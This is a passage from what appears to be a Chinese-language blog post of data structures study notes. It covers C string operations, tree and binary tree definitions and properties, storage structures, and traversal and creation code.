punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>S<span class="token operator">-></span>Len <span class="token operator">&lt;</span> MAXSIZE<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//连接后串长大于MAXSIZE，但串S长度小于MAXSIZE，连接后串T部分字符序列被舍弃</span>    <span class="token punctuation">{</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> S<span class="token operator">-></span>Len<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> MAXSIZE<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            S<span class="token operator">-></span>ch<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> T<span class="token operator">-></span>ch<span class="token punctuation">[</span>i <span class="token operator">-</span> S<span class="token operator">-></span>Len<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        S<span class="token operator">-></span>Len <span class="token operator">=</span> MAXSIZE<span class="token punctuation">;</span>        flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token comment" spellcheck="true">//串S的长度等于MAXSIZE，串T不被连接</span>    <span class="token punctuation">{</span>        flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> flag<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="子串替换"><a href="#子串替换" class="headerlink" title="子串替换"></a>子串替换</h3><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">StrReplace</span><span class="token punctuation">(</span>String<span class="token operator">*</span> S<span class="token punctuation">,</span> String<span class="token operator">*</span> T<span class="token punctuation">,</span> String<span class="token operator">*</span> V<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//子串替换，用串V替换串S中出现得到所有与T相等的不重叠子串</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">,</span> p<span class="token punctuation">,</span> q<span class="token punctuation">;</span>    n <span class="token operator">=</span> S<span class="token operator">-></span>Len<span class="token punctuation">;</span>    m <span class="token operator">=</span> T<span class="token operator">-></span>Len<span class="token punctuation">;</span>    q <span class="token operator">=</span> V<span class="token operator">-></span>Len<span class="token punctuation">;</span>    p <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">do</span> <span class="token punctuation">{</span>        i <span class="token operator">=</span> <span class="token function">StrIndex</span><span class="token punctuation">(</span>S<span class="token punctuation">,</span> T<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//调用定位函数得到子串T在子串S的位置</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//当主串S有该子串T时</span>        <span class="token punctuation">{</span>            <span class="token function">StrDelete</span><span class="token punctuation">(</span>S<span class="token punctuation">,</span> i<span class="token punctuation">,</span> m<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//删除子串T</span>            <span class="token function">StrInsert</span><span class="token punctuation">(</span>S<span class="token punctuation">,</span> V<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//插入子串V</span>            p <span class="token operator">=</span> i <span class="token operator">+</span> q<span class="token punctuation">;</span>            S<span class="token operator">-></span>Len <span class="token operator">=</span> S<span class="token operator">-></span>Len <span class="token operator">+</span> q <span class="token operator">-</span> m<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//修改主串S的长度</span>            n <span class="token operator">=</span> S<span class="token operator">-></span>Len<span class="token punctuation">;</span><span class="token operator">+</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>p <span class="token operator">&lt;=</span> n <span class="token operator">-</span> m <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>i <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="小结-4"><a href="#小结-4" class="headerlink" title="小结"></a>小结</h2><p>串这部分内容呢比较简单，后面还有广义表和KMP算法，这里先不讲了；下周直接学非线性结构；</p><p>Bye Bye~</p><h1 id="树—Tree"><a href="#树—Tree" class="headerlink" title="树—Tree"></a>树—Tree</h1><p>早就对 ”树“ 有所耳闻了，今日一会，果然名不虚传；</p><h2 id="树的定义"><a href="#树的定义" class="headerlink" title="树的定义"></a>树的定义</h2><h3 id="定义-8"><a href="#定义-8" class="headerlink" title="定义"></a>定义</h3><p>树（Tree）是n（n≥0）个结点的有限集；n=0时称为空树；在任意一棵非空树中：</p><p>(1) 有且仅有一个特定的称为根（Root）的结点；</p><p>(2) 当n&gt;1时，其余结点可分为m（m&gt;0）个互不相交的有限集T1、T2、……、Tm，其中每一个集合本身又是一棵</p><p>树，并且称为根的子树（SubTree）；</p><h3 id="树的表示方法"><a href="#树的表示方法" class="headerlink" title="树的表示方法"></a>树的表示方法</h3><p>1、树形表示法：使用一棵倒置的树表示，如下图（1）所示；</p><p>2、嵌套集合表示法：使用集合以及集合的包含关系描述树结构，如图（2）所示；</p><p>3、凹入表表示法：使用线段的伸缩关系描述树的结构，如图（3）所示；</p><p>4、广义表表示法：将树的根结点写在括号的左边 ，除根结点外的其余结点写在括号内并用逗号间隔来描述树的结</p><p>构，如图（4）所示；</p><p><img src="/images/%E6%A0%91%E7%9A%84%E8%A1%A8%E7%A4%BA%E6%96%B9%E6%B3%95.png" alt="树的表示方法"></p><h3 id="树的基本术语"><a href="#树的基本术语" class="headerlink" title="树的基本术语"></a>树的基本术语</h3><p><strong>(１) 结点———树的结点包含一个数据元素及若干指向其子树的分支；</strong></p><p><strong>(２) 结点的度———结点所拥有的分支数目或后继结点个数称为该结点的度；</strong> </p><p><strong>(３) 树的度———树中各结点度的最大值称为该树的度；</strong></p><p><strong>(４) 叶结点 (终端结点) ———度为零的结点称为叶结点；</strong></p><p><strong>(５) 分支结点 (非终端结点) ———度不为零的结点称为分支结点；</strong></p><p><strong>(６) 孩子、双亲结点———一个结点的子树的根称为该结点的孩子；该结点称为孩子的双亲；</strong></p><p><strong>(7) 兄弟结点———同一双亲结点下的孩子结点互称为兄弟结点；</strong></p><p><strong>(8) 堂兄弟———双亲互为兄弟的两个结点互称为堂兄弟；</strong></p><p><strong>(9) 子孙结点———一个结点的所有子树中的结点称之为该结点的子孙结点；</strong></p><p><strong><em>(10) 祖先结点———从树根结点到达一个结点的路径上的所有结点称为该结点的祖先结点</em></strong></p><p><strong>(11) 结点的层次———树的根结点的层次为１，其余结点的层次等于它双亲结点的层次加１；（某结点在第L层，</strong></p><p><strong>它的子树的根就在L+1层）；</strong></p><p><strong>(12) 树的深度———树中结点的最大层次称为树的深度 (或高度)；</strong></p><p><strong><em>(13) 有序树和无序树———如果一棵树中的结点的各子树从左到右是有次序的， 即若交换了某结点各子树的相对</em></strong></p><p><strong>位置， 则构成了不同的树， 称这样的树为有序树，反之， 则为 无序树；</strong></p><p><strong>(14) 森林———ｍ (ｍ≥０) 棵互不相交树的集合称为森林；</strong></p><h2 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h2><h3 id="二叉树定义"><a href="#二叉树定义" class="headerlink" title="二叉树定义"></a>二叉树定义</h3><p><strong>二叉树（Binary Tree）是有n（n≥0）个结点的有限集合；该集合或者为空集（称为空二叉树），或者由一个根结点和两颗互不相交的、分别称为根结点的左子树和右子树的二叉树组成；</strong></p><h3 id="二叉树的特点"><a href="#二叉树的特点" class="headerlink" title="二叉树的特点"></a>二叉树的特点</h3><p><strong>1、每个结点最多有两棵子树，所以二叉树中不存在度大于2的结点；</strong></p><p><strong>2、左子树和右子树是有顺序的，次序不能任意颠倒；</strong></p><p><strong>3、即使树中某结点只有一颗子树，也要区分它是左子树还是右子树；</strong></p><h3 id="二叉树的基本形态"><a href="#二叉树的基本形态" class="headerlink" title="二叉树的基本形态"></a>二叉树的基本形态</h3><p>二叉树具有5种基本形态：</p><p>1、空二叉树</p><p>2、只要一个根结点</p><p>3、根结点只有左子树</p><p>4、根结点只有右子树</p><p>5、根结点既有左子树又有右子树</p><h3 id="二叉树的性质"><a href="#二叉树的性质" class="headerlink" title="二叉树的性质"></a>二叉树的性质</h3><p><strong>● 在二叉树的第i层上至多有2^(i-1)个结点（i≥0）;</strong></p><p><strong>● 深度为k的二叉树至多有2^k - 1个结点（k≥1）；</strong></p><p><strong>● 对任意一棵二叉树T， 如果其叶子结点数为n0，度为２的结点数为n2，则有n0 = n2+1;</strong></p><p><strong>● 具有ｎ个结点的完全二叉树的深度为[log2n]+1;([x]为不大于x的最大整数)</strong></p><p><strong>● 如果一棵有ｎ个结点的完全二叉树 (其深度为[log2n]+1) 的结点按层次编号 (从第1层到第[log2n]+1层，每层从左</strong></p><p><strong>到右) 则对任一结点ｉ (1≤ｉ≤ｎ) 有:</strong> </p><p>​        <strong>➀ 如果 i＝1， 结点ｉ是根结点， 无双亲； 如果ｉ&gt;1， 则其双亲结点是结点i/2；</strong></p><p>​        <strong>➁ 如果 2i&gt;ｎ， 则结点ｉ无左孩子， 该结点为叶子结点， 否则其左孩子是结点2i ；</strong></p><p>​        <strong>➂ 如果 2i+1&gt;ｎ， 则结点ｉ无右孩子， 该结点为叶子结点， 否则其右孩子是结点 2i＋1；</strong></p><h3 id="特殊二叉树"><a href="#特殊二叉树" class="headerlink" title="特殊二叉树"></a>特殊二叉树</h3><h4 id="斜树"><a href="#斜树" class="headerlink" title="斜树"></a>斜树</h4><h5 id="定义-9"><a href="#定义-9" class="headerlink" title="定义"></a>定义</h5><p>所有的结点都是只有左子树的二叉树叫做左斜树，所有的结点都是只有右子树的二叉树叫做右斜树；这两者统称为</p><p>斜树；</p><h5 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h5><p>每一层都只有一个结点，结点的个数与二叉树的深度相同；</p><p>如图：</p><p><img src="/images/%E6%96%9C%E6%A0%91.png" alt="斜树"></p><h4 id="满二叉树"><a href="#满二叉树" class="headerlink" title="满二叉树"></a>满二叉树</h4><h5 id="定义-10"><a href="#定义-10" class="headerlink" title="定义"></a>定义</h5><p>在一棵二叉树中，如果所有分支结点都存在左子树和右子树，并且所有叶子都在同一层上，这样的二叉树称为满二</p><p>叉树；</p><h5 id="特点-2"><a href="#特点-2" class="headerlink" title="特点"></a>特点</h5><p>满二叉树很符合强迫症患者，其特点有：</p><p>1、叶子只能出现在最下一层，出现在其它层就不可能达成平衡 ；</p><p>2、非叶子结点的度一定是2，否则就是“缺胳膊少腿”了；</p><p>3、在同样的深度的二叉树中，满二叉树的结点个数最多，叶子数最多；</p><p>如图：</p><p><img src="/images/%E6%BB%A1%E4%BA%8C%E5%8F%89%E6%A0%91.png" alt="满二叉树"></p><h4 id="完全二叉树"><a href="#完全二叉树" class="headerlink" title="完全二叉树"></a>完全二叉树</h4><h5 id="定义-11"><a href="#定义-11" class="headerlink" title="定义"></a>定义</h5><p>对一棵具有n个结点的二叉树按层序编号，如果编号为i（1≤i≤n）的结点与同样深度的满二叉树中编号为i的结点在</p><p>二叉树中位置完全相同，则这课二叉树称为完全二叉树；</p><h5 id="特点-3"><a href="#特点-3" class="headerlink" title="特点"></a>特点</h5><p>1、叶子结点只能出现在最下两层；</p><p>2、最下面的叶子一定集中在左部连续位置；</p><p>3、倒数二层，若有叶子结点，一定都在右部连续位置；</p><p>4、如果结点度为1，则该结点只有左孩子，即不存在只有右孩子的情况；</p><p>5、同样结点数的二叉树，完全二叉树的深度最小；</p><p>如图：</p><p><img src="/images/%E5%AE%8C%E5%85%A8%E4%BA%8C%E5%8F%89%E6%A0%91.png" alt="完全二叉树"></p><p>// 判断某二叉树是否为完全二叉树：给每个结点按照满二叉树的结构逐层顺序编号，如果编号出现空档，就说明不</p><p>是完全二叉树，否则就是；</p><h3 id="二叉树的存储结构"><a href="#二叉树的存储结构" class="headerlink" title="二叉树的存储结构"></a>二叉树的存储结构</h3><h4 id="二叉树的顺序存储结构"><a href="#二叉树的顺序存储结构" class="headerlink" title="二叉树的顺序存储结构"></a>二叉树的顺序存储结构</h4><p>二叉树的顺存储结构就是用一位数组存储二叉树中的结点，并且结点的存储位置，也就是数组的下标要能体现结点</p><p>之间的逻辑关系；编号过程：首先，把树的根节点的编号定为1，然后按照层次从上到下，从左到右的顺序对每一</p><p>结点进行编号，当一个结点的双亲结点的编号为i时，若它是左孩子，则编号为2i，若它是右孩子，则编号为2i+1;</p><p>但是这种存储结构会浪费大量的空间，一般适用于完全二叉树；</p><h4 id="二叉树的链式存储结构"><a href="#二叉树的链式存储结构" class="headerlink" title="二叉树的链式存储结构"></a>二叉树的链式存储结构</h4><h5 id="二叉链表"><a href="#二叉链表" class="headerlink" title="二叉链表"></a>二叉链表</h5><p>二叉树的每个结点最多有两个孩子，所以为它设计一个数据域和两个指针域，我们称这样的链表叫做二叉链表；</p><h5 id="抽象数据类型"><a href="#抽象数据类型" class="headerlink" title="抽象数据类型"></a>抽象数据类型</h5><pre class="line-numbers language-c"><code class="language-c"><span class="token number">1</span>、<span class="token function">InitTree</span><span class="token punctuation">(</span><span class="token operator">*</span>T<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//构造空树T</span><span class="token number">2</span>、<span class="token function">DestroyTree</span><span class="token punctuation">(</span><span class="token operator">*</span>T<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//销毁树T</span><span class="token number">3</span>、<span class="token function">CreateTree</span><span class="token punctuation">(</span><span class="token operator">*</span>T<span class="token punctuation">,</span>definition<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//按definition中给出树的定义来构造树</span><span class="token number">4</span>、<span class="token function">ClearTree</span><span class="token punctuation">(</span><span class="token operator">*</span>T<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//若树T存在，则将树T清空为空树</span><span class="token number">5</span>、<span class="token function">TreeEmpty</span><span class="token punctuation">(</span>T<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//若树为空树，返回true，否则返回false</span><span class="token number">6</span>、<span class="token function">TreeDepth</span><span class="token punctuation">(</span>T<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//返回T的深度</span><span class="token number">7</span>、<span class="token function">Root</span><span class="token punctuation">(</span>T<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//返回T的根节点</span><span class="token number">8</span>、<span class="token function">Value</span><span class="token punctuation">(</span>T<span class="token punctuation">,</span>cur_e<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//cur_e是树T中一个结点，返回此结点的值</span><span class="token number">9</span>、<span class="token function">Assign</span><span class="token punctuation">(</span>T<span class="token punctuation">,</span>cur_e<span class="token punctuation">,</span>value<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//给树T的结点cur_e赋值为value</span><span class="token number">10</span>、<span class="token function">Parent</span><span class="token punctuation">(</span>T<span class="token punctuation">,</span>cur_e<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//若cur_e是树T的非根结点，则返回它的双亲，否则返回空</span><span class="token number">11</span>、<span class="token function">LsftChild</span><span class="token punctuation">(</span>T<span class="token punctuation">,</span>cur_e<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//若cur_e是树T的非叶结点，则返回它的最左孩子，否则返回空</span><span class="token number">12</span>、<span class="token function">RightSibling</span><span class="token punctuation">(</span>T<span class="token punctuation">,</span>cur_e<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//若cur_e有右兄弟，则返回它的右兄弟，否则返回空</span><span class="token number">13</span>、<span class="token function">InsertChild</span><span class="token punctuation">(</span><span class="token operator">*</span>T<span class="token punctuation">,</span><span class="token operator">*</span>p<span class="token punctuation">,</span>i<span class="token punctuation">,</span>c<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//其中p指向树T的某个结点，i为所指结点p的度加上1，非空树c与T不相交，操作结果为输入c为树T中p指结点的第i棵子树</span><span class="token number">14</span>、<span class="token function">DeleteChild</span><span class="token punctuation">(</span><span class="token operator">*</span>T<span class="token punctuation">,</span><span class="token operator">*</span>p<span class="token punctuation">,</span>i<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//其中p指向树T的某个结点，i为所指结点p的度，操作结果为删除T中p所指结点的第i棵子树</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="存储结构-1"><a href="#存储结构-1" class="headerlink" title="存储结构"></a>存储结构</h5><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">char</span> DataType<span class="token punctuation">;</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> BTNode<span class="token punctuation">{</span>    DataType data<span class="token punctuation">;</span>    <span class="token keyword">struct</span> BTNode<span class="token operator">*</span> lchild<span class="token punctuation">,</span> <span class="token operator">*</span> rchild<span class="token punctuation">;</span><span class="token punctuation">}</span>BTNode<span class="token punctuation">,</span><span class="token operator">*</span>BTree<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="二叉树的遍历"><a href="#二叉树的遍历" class="headerlink" title="二叉树的遍历"></a>二叉树的遍历</h3><h4 id="定义-12"><a href="#定义-12" class="headerlink" title="定义"></a>定义</h4><p><strong>二叉树的遍历（traversing binary tree）是指从根结点出发，按照某种次序依次访问二叉树中所有结点，使得每个结点被访问一次且仅被访问一次；</strong></p><p>以这棵树为例：</p><p><img src="/images/%E9%81%8D%E5%8E%86%E4%BA%8C%E5%8F%89%E6%A0%91.png" alt="遍历二叉树"></p><h4 id="前序遍历"><a href="#前序遍历" class="headerlink" title="前序遍历"></a>前序遍历</h4><h5 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h5><p><strong>若二叉树为空，遍历结束，否则依次执行以下操作：</strong></p><p><strong>1、访问根结点</strong></p><p><strong>2、先序遍历根结点的左子树</strong></p><p><strong>3、先序遍历根结点的右子树</strong></p><h5 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h5><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">PreOrderTraverse</span><span class="token punctuation">(</span>BTree T<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//前序遍历</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>T <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span> T<span class="token operator">-></span>data<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//显示结点数据</span>    <span class="token function">PreOrderTraverse</span><span class="token punctuation">(</span>T<span class="token operator">-></span>lchild<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//先序遍历左子树</span>    <span class="token function">PreOrderTraverse</span><span class="token punctuation">(</span>T<span class="token operator">-></span>rchild<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//先序遍历右子树</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h5><p>先序遍历输出为：<code>ABDGHCEIF</code></p><h4 id="中序遍历"><a href="#中序遍历" class="headerlink" title="中序遍历"></a>中序遍历</h4><h5 id="操作-1"><a href="#操作-1" class="headerlink" title="操作"></a>操作</h5><p><strong>若二叉树为空，遍历结束，否则依次执行以下操作：</strong></p><p><strong>1、中序遍历根结点的左子树</strong></p><p><strong>2、访问根结点</strong></p><p><strong>3、中序遍历根结点的右子树</strong></p><h5 id="算法-1"><a href="#算法-1" class="headerlink" title="算法"></a>算法</h5><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">InOrderTraverse</span><span class="token punctuation">(</span>BTree T<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//中序遍历</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>T <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">InOrderTraverse</span><span class="token punctuation">(</span>T<span class="token operator">-></span>lchild<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//中序遍历左子树</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span> T<span class="token operator">-></span>data<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//显示结点数据</span>    <span class="token function">InOrderTraverse</span><span class="token punctuation">(</span>T<span class="token operator">-></span>rchild<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//中序遍历右子树</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="输出-1"><a href="#输出-1" class="headerlink" title="输出"></a>输出</h5><p>中序遍历输出为：<code>BGDHAEICF</code></p><h4 id="后序遍历"><a href="#后序遍历" class="headerlink" title="后序遍历"></a>后序遍历</h4><h5 id="操作-2"><a href="#操作-2" class="headerlink" title="操作"></a>操作</h5><p><strong>若二叉树为空，遍历结束，否则依次执行以下操作：</strong></p><p><strong>1、后序遍历根结点的左子树</strong></p><p><strong>2、后序遍历根结点的右子树</strong></p><p><strong>3、访问根结点</strong> </p><h5 id="算法-2"><a href="#算法-2" class="headerlink" title="算法"></a>算法</h5><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">PostOrderTraverse</span><span class="token punctuation">(</span>BTree T<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//后序遍历</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>T <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">PostOrderTraverse</span><span class="token punctuation">(</span>T<span class="token operator">-></span>lchild<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//后序遍历左子树</span>    <span class="token function">PostOrderTraverse</span><span class="token punctuation">(</span>T<span class="token operator">-></span>rchild<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//后序遍历右子树</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span> T<span class="token operator">-></span>data<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//显示结点数据</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="输出-2"><a href="#输出-2" class="headerlink" title="输出"></a>输出</h5><p>后序遍历输出为：<code>GHDBIEFCA</code></p><h4 id="层序遍历"><a href="#层序遍历" class="headerlink" title="层序遍历"></a>层序遍历</h4><h5 id="操作-3"><a href="#操作-3" class="headerlink" title="操作"></a>操作</h5><p><strong>若二叉树为空，遍历结束，否则从树的第一层，也就是根结点开始访问，从上而下逐层遍历，在同一层中，按从左到右的顺序对结点逐个访问；</strong></p><h5 id="算法-3"><a href="#算法-3" class="headerlink" title="算法"></a>算法</h5><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">LevelOrderTraverse</span><span class="token punctuation">(</span>BTree T<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//层序遍历</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> front<span class="token punctuation">,</span> rear<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//定义队头队尾指针</span>    BTree p<span class="token punctuation">,</span> q<span class="token punctuation">[</span>MAX<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//定义循环队列，存放结点指针</span>    p <span class="token operator">=</span> T<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>p <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//若二叉树为空，则根结点地址入队</span>    <span class="token punctuation">{</span>        front <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        q<span class="token punctuation">[</span>front<span class="token punctuation">]</span> <span class="token operator">=</span> p<span class="token punctuation">;</span>        rear <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>front <span class="token operator">!=</span> rear<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//队列不为空</span>    <span class="token punctuation">{</span>        p <span class="token operator">=</span> q<span class="token punctuation">[</span>front<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span> p<span class="token operator">-></span>data<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//访问队首结点的数据域</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>p<span class="token operator">-></span>lchild <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//将队首结点的左孩子入列</span>        <span class="token punctuation">{</span>            q<span class="token punctuation">[</span>rear<span class="token punctuation">]</span> <span class="token operator">=</span> p<span class="token operator">-></span>lchild<span class="token punctuation">;</span>            rear <span class="token operator">=</span> <span class="token punctuation">(</span>rear <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> MAX<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>p<span class="token operator">-></span>rchild <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//将队首结点的右孩子入列</span>        <span class="token punctuation">{</span>            q<span class="token punctuation">[</span>rear<span class="token punctuation">]</span> <span class="token operator">=</span> p<span class="token operator">-></span>rchild<span class="token punctuation">;</span>            rear <span class="token operator">=</span> <span class="token punctuation">(</span>rear <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> MAX<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        front <span class="token operator">=</span> <span class="token punctuation">(</span>front <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> MAX<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="输出-3"><a href="#输出-3" class="headerlink" title="输出"></a>输出</h5><p>层序遍历的输出为：<code>ABCDEFGHI</code></p><h3 id="二叉树的建立"><a href="#二叉树的建立" class="headerlink" title="二叉树的建立"></a>二叉树的建立</h3><h4 id="特殊处理"><a href="#特殊处理" class="headerlink" title="特殊处理"></a>特殊处理</h4><p>为了让树的每个结点确认是否有左右孩子，我们对它进行了扩展，将空结点赋值 “#” ，我们成这种处理后的二叉树为原二叉树的扩展二叉树，所以就会得到类似于“AB##C#D###”的序列；</p><p>算法</p><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">CreateBTree</span><span class="token punctuation">(</span>BTree<span class="token operator">*</span> T<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//建立二叉树</span><span class="token punctuation">{</span>    DataType ch<span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>ch<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>ch <span class="token operator">==</span> <span class="token string">'#'</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token operator">*</span>T <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>      